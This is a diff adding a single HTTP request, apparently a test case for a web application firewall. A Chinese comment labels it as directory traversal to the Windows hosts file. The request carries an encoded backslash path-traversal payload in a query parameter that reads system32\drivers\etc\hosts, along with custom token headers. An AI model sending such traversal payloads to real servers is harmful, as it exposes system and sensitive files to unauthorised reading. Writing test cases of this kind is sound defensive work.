@@ -1,0 +1,9 @@
+# 目录遍历_drivers\etc\hosts
+# 攻击者通过构造此语句可以遍历目录访问IP地址和域名的对应文件，还可以构造其他文件路径获取更多敏感信息。
+GET /?id=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts&bid=hd_tag_m8mv24nl HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24nl
+RM-PRO-Token: de4d6373228f201382294b03411556dd
+RM-PRO-Time: 1742808395239
+User-Agent: curl/7.83.1
+
